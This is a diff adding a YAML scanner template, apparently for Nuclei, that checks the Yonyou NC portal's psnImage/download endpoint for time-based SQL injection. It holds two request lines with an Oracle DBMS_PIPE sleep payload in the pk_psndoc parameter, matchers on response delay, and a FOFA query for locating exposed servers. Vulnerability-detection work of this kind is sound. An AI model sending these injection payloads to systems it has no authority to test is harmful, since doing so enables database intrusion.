@@ -1,0 +1,29 @@
+id: yongyouNC-psnImage-download-SQL
+
+info:
+  tags: yongyouNC-psnImage-download-SQL
+  name: yongyouNC-psnImage-download-SQL
+  author: xc
+  severity: high
+  description: yongyouNC-psnImage-download-SQL
+  metadata:
+    fofa-qeury: icon_hash="1085941792"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        GET /portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(79)||CHR(66)||CHR(101),6)%20AND%20(%27rASZ%27=%27rASZ HTTP/1.1
+        Host: 
+
+      - |
+        GET /portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(79)||CHR(66)||CHR(101),10)%20AND%20(%27rASZ%27=%27rASZ HTTP/1.1
+        Host:
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=6 && duration_1<=7'  
+          - 'duration_2>=10 && duration_2<=11'
